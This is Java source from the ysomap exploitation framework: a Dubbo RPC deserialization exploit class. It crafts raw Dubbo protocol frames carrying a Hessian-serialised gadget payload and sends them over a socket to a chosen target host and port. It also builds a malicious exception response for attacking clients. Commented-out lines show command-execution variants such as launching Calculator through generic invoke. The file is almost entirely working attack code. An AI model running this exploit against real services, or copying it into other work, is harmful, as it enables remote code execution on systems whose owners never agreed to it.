package ysomap.exploits.dubbo;

import com.caucho.hessian.io.Hessian2Output;
import org.apache.commons.codec.DecoderException;
import ysomap.common.annotation.*;
import ysomap.common.util.Status;
import ysomap.core.serializer.hessian.NoWriteReplaceSerializerFactory;
import ysomap.core.util.ByteHelper;
import ysomap.core.util.SocketHelper;
import ysomap.exploits.AbstractExploit;
import ysomap.payloads.Payload;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.HashMap;
import java.util.Random;

/**
 * @author wh1t3p1g
 * @since 2023/4/3
 */
@Exploits
@Authors({Authors.WH1T3P1G})
@Require(bullets = {}, param = false)
@Details("dubbo rpc 反序列化漏洞")
public class DubboRPCExploit extends AbstractExploit {

    @NotNull
    @Require(name = "host", detail = "目标IP")
    public String host = null;

    @NotNull
    @Require(name = "port", type = "int",detail = "目标端口")
    public String port = "20880";

    @NotNull
    public Payload payload;
    public String payloadName;

    @Override
    public void work() {
        try {
            byte[] data = generateRequest(payload.getObject());
//            byte[] data = generateRequest("test");
            String ret = SocketHelper.send(host, Integer.parseInt(port), data, 5000);
            System.out.println(ret);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void stop() {
        setStatus(Status.STOPPED);
    }


    enum SerializeType  {
        Hessian(2),
        Java(3),
        CompactedJava(4),
        FastJSON(6),
        NativeJava(7),
        Kryo(8),
        FST(9)
        ;

        private byte code;

        SerializeType(int code){
            this.code=(byte) code;
        }

        public byte getCode() {
            return code;
        }
    }

    enum ResponseType {
        RESPONSE_WITH_EXCEPTION(0),
        RESPONSE_VALUE(1),
        RESPONSE_WITH_EXCEPTION_WITH_ATTACHMENTS(3),
        RESPONSE_VALUE_WITH_ATTACHMENTS(4),
        RESPONSE_NULL_VALUE_WITH_ATTACHMENTS(5)
        ;

        public byte code;

        ResponseType(int code){
            this.code=(byte) code;
        }

        public byte getCode() {
            return code;
        }
    }

    // 参考 com.alibaba.dubbo.remoting.exchange.codec.ExchangeCodec#encodeRequest
    public static byte[] generateRequest(Object payload) throws IOException, DecoderException {
        // header
        byte[] header = new byte[16];
        short MAGIC = (short) 0xdabb;
        byte FLAG_REQUEST = (byte) 0x80;
        ByteHelper.short2bytes(MAGIC, header);
        header[2] = (byte) (FLAG_REQUEST | SerializeType.Hessian.getCode());
        ByteHelper.long2bytes(new Random().nextInt(100000000), header, 4);
        // payload
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output output = new Hessian2Output(baos);
        NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
        sf.setAllowNonSerializable(true);
        output.setSerializerFactory(sf);
        output.writeString("2.0.2"); // version

        output.writeString("com.example.demo.service.DemoService"); // service
        output.writeString("1.0.0"); // service version
        output.writeString("sayHello");
        output.writeString("Ljava/lang/String;");
        output.writeString("test");

//        output.writeString("org.apache.dubbo.InService"); // service
//        output.writeString(""); // service version
//        output.writeString("$invoke");
//        output.writeString("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
//        output.writeString("ls"); // name
//        output.writeObject(new String[]{"java.lang.String"}); // types
//        output.writeObject(new Object[]{"open -a Calculator.app"}); // args

//        output.writeString("org.apache.dubbo.metadata.MetadataService"); // service
//        output.writeString("1.0.0"); // service version
//        output.writeString("$echo");
//        output.writeString("Ljava/lang/Object;");
//        output.writeObject(payload);

        HashMap hkhash = new HashMap();
//        hkhash.put("generic", "raw.return");
        hkhash.put("aaa", "bb");
        output.writeObject(hkhash);
        output.flush();
        output.close();
        // pack
        ByteHelper.int2bytes(baos.size(), header, 12);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        out.write(header);
        out.write(baos.toByteArray());

        return out.toByteArray();
    }

    public static byte[] generateResponse(Object payload) throws IOException, DecoderException {
        // header
        byte[] header = new byte[16];
        short MAGIC = (short) 0xdabb;
        ByteHelper.short2bytes(MAGIC, header);
        header[2] = SerializeType.Hessian.getCode();
        header[3] = (byte) 20; // status ok
        ByteHelper.long2bytes(new Random().nextInt(100000000), header, 4);
        // payload
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output output = new Hessian2Output(baos);
        NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
        sf.setAllowNonSerializable(true);
        output.setSerializerFactory(sf);
        output.writeInt(ResponseType.RESPONSE_WITH_EXCEPTION.getCode());
        output.writeObject(payload);
        output.flush();
        output.close();
        // pack
        ByteHelper.int2bytes(baos.size(), header, 12);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        out.write(header);
        out.write(baos.toByteArray());

        return out.toByteArray();
    }
}
